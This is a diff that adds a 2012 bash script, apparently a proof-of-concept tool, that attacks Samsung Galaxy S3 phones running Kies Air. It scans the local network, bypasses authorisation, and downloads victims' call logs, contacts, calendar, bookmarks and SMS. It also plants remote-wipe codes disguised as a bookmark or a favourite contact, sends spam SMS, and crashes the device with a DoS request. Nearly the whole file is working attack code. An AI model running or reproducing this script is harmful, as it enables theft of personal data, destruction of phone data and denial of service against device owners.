@@ -1,0 +1,122 @@
+#!/bin/bash
+
+echo " ... "
+echo " ..'',."
+echo " ,cl:."
+echo " ,dOo'"
+echo " ..''''''. .,,. .'. ',' '' .'. ',. ,, .lXXd."
+echo " .x0dllllllc kMWN. ;K: cMMM: ;Kk. c0d. :W0. .0Ml :NW0c"
+echo " kK' cMxcWO ;K: 'NK:WN. .k0; .xKc :WX' .KWo 'WMM0."
+echo " O0. .NX. dMc ;K: .XW, cWk lKl 'Ok' :WN' .KN: .',;;,'.......'lWMMX'"
+echo " O0. .KW; .KN' ;K: kMd xM: ;0O0d ,XX'.KW, .KMMK:. ....''.. "
+echo " O0. ,c xMXllccOMX. ;K: :MWdclldWN. .kKK; .XNNN; 0MMk "
+echo " O0. dK. :MK:;;;;;kMk ;K: .NX:;;;;;oWK. 'Ok,lKl 'WMc dWMO."
+echo " kK. dK. .XX. .0M: ;Kl kW; xMx l0d ;0k. NM; .cKWk,"
+echo " :Kk,..'''xK. kM: .XX. .kKl''...... oMx .KW; .xKc .k0; NM; 'lO0c."
+echo " .;loooool; .xl ,x; ,cooooooo, .dd. .xl co' co. dx. .;oo:."
+echo " ',... "
+echo " ..."
+echo " Samsung S3 Kies Air Scanner - v.1.3 www.samsung.com/us/kies/"
+echo ""
+echo ""
+echo " 
+#################################################################################################################"
+echo " Filename : kiesauth.sh"
+echo " Date : 10/23/2012"
+echo " Authors : @cron__"
+echo " Presentation : http://www.slideshare.net/firmware/kies-air-launch-steal-crash"
+echo " Whitepaper : http://dl.dropbox.com/u/7779799/SamsungKiesAirAuthorizationBypassandDoS.pdf"
+echo " Version : 1.3"
+echo " Description : Script to detect local running Kies Air web servers on Samsung Galaxy S3 phones."
+echo " 
+#################################################################################################################"
+echo ""
+echo ""
+
+while true; do
+printf "%s\n" "1) Scan local network"
+printf "%s\n" "2) Send DoS"
+printf "\n%s\t" "Enter an option:"
+
+read option
+
+# Option 1
+case $option in
+[1]) ip=`ifconfig | awk /inet\ /`
+echo $ip
+echo "Type in your IP: "
+
+read ipstart
+echo -e "Scanning in progress...\n"
+sudo nmap -sS -p 8080 ${ipstart}-254 -vv >> nmap_scan.txt
+awk '/Nmap scan report for android/ || /open/ || /Samsung/' nmap_scan.txt >> ka_online.txt
+printf "%s\n\n\n" "Active servers found: "
+cat ka_online.txt
+printf "%s\t" "Was a server found? type 'y' or 'n' and press [Enter]"
+
+read connect
+if [ $connect = y ]
+then
+echo "Enter the target IP and press [Enter]"
+read target_found
+wget --ignore-length --quiet http://${target_found}:8080/www/index.gz.html
+printf "\n\n%s\n" "1) Grab logs (incoming/outgoing calls)"
+printf "%s\n" "2) Grab address book"
+printf "%s\n" "3) Grab calendar events (experimental)"
+printf "%s\n" "4) Grab bookmarks"
+printf "%s\n" "5) Grab SMS (incoming/outgoing)"
+printf "%s\n" "6) Send remote wipe"
+printf "\n%s\t" "We have access, what would you like to do?"
+
+read action
+case $action in
+[1]) wget --ignore-length --quiet -O call_log.txt 
+http://${target_found}:8080/ws/telephony/log?startIndex=0&maxItems=500&sort=time-descending ;;
+[2]) wget --ignore-length --quiet -O addressbook.txt 
+http://${target_found}:8080/ws/pim/contacts?startIndex=0&maxItems=100&sort=alpha-ascending ;;
+[3]) wget --ignore-length --quiet -O calendar_events.txt 
+http://${target_found}:8080/ws/calendar/instances/1348977600/1352606400?searchQuery=calendarId:1calendarId:2&1351121143933 
+;;
+[4]) wget --ignore-length --quiet -O bookmarks.txt 
+http://${target_found}:8080/ws/browser/bookmarks?startIndex=0&maxItems=100&sort=time-descending ;;
+[5]) wget --ignore-length --quiet -O messages.txt 
+http://${target_found}:8080/ws/messaging/messages?startIndex=0&maxItems=10&sort=timestamp_descending ;;
+[6]) printf "\n\n%s\n" "1) Add remote wipe as a bookmark"
+printf "%s\n" "2) Replace the default AT&T bookmark link with remote wipe"
+printf "%s\n" "3) Replace contact information with remote wipe and mark it as favorite"
+printf "%s\n" "4) Add remote wipe to address book and mark it as favorite"
+printf "%s\n" "5) Send spam SMS"
+printf "\n%s\t" "Choose an option:"
+
+read wipe_option
+case $wipe_option in
+[1]) wipe1=`wget --ignore-length --server-response --quiet --post-data 
+'url=http://192.168.1.132%2Fremotewipe.html&title=AT%26T%20Mobile%20Web' 
+http://${target_found}:8080/ws/browser/bookmarks` ;;
+[2]) echo "DELETE method not supported by wget." ;;
+[3]) wipe3=`curl -O curl_response.txt -X PUT -d 
+"title=&firstName=Vicky&lastName=&suffix=&nickName=&homePhoneNo=&workPhoneNo=&mobilePhoneNo=*2767*3855%23&defaultPhoneNo=-1&workEmail=&homeEmail=&otherEmail=&organisation=&jobTitle=&favourite=true&accountType=Phone&accountName=Phone" 
+http://${target_found}:8080/ws/pim/contacts/37` ;;
+[4]) wipe4=`wget --ignore-length --quiet --post-data 'title=&firstName=CALL FOR A SEXY 
+TIME&lastName=&suffix=&nickName=&homePhoneNo=&workPhoneNo=&mobilePhoneNo=*2767*3855%23&defaultPhoneNo=-1&workEmail=&homeEmail=&otherEmail=&organisation=&jobTitle=&favourite=true&accountType=Phone&accountName=Phone' 
+http://${target_found}:8080/ws/pim/contacts` echo -e "Entry added." ;;
+[5]) wipe5=`wget --ignore-length --quiet --post-data 
+'folderId=&destination=tel:111&destinationContactId=&destinationName=&body=Hey click this link! 
+goatse.cx&mimeType=text/plain' http://${target_found}:8080/ws/messaging/sms/messages` ;;
+
+esac
+esac
+
+elif [ $connect = n ]
+then
+printf "%s" "No available targets found."
+else
+printf "%s" "Not a valid entry. Aborted."
+fi;;
+
+# Option 2: Manually specify this for now.
+[2]) t1=`wget --quiet -p 'http://192.168.1.136:8080/www/apps/KiesAir/jws/ssd.php?E&&'` echo -e "Crash successfully 
+sent to device.\n" ;;
+esac
+echo -e "Script reloaded.\n"
+done
